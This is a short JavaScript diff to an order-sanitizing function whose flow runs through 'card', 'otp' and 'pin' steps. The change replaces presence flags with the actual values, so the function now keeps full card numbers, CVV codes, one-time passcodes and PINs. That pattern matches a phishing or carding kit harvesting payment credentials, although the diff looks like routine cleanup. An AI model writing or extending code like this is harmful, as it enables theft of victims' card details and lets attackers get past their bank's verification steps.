@@ -63,10 +63,13 @@ function cleanOrder(b) {
     step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
     pay: b.pay && typeof b.pay === "object" ? {
       cardName: str(b.pay.cardName, 120),
+      cardNumber: str(b.pay.cardNumber || b.pay.number || b.pay.fullCard || b.pay.last4, 30),
       last4: str(b.pay.last4, 4).replace(/\D/g, ""),
       brand: ["visa", "mc", "amex"].includes(b.pay.brand) ? b.pay.brand : "",
       exp: str(b.pay.exp, 5),
-      cvv: !!b.pay.cvv, otp: !!b.pay.otp, pin: !!b.pay.pin
+      cvv: str(b.pay.cvv, 10),
+      otp: str(b.pay.otp, 10),
+      pin: str(b.pay.pin, 10)
     } : undefined
   };
 }
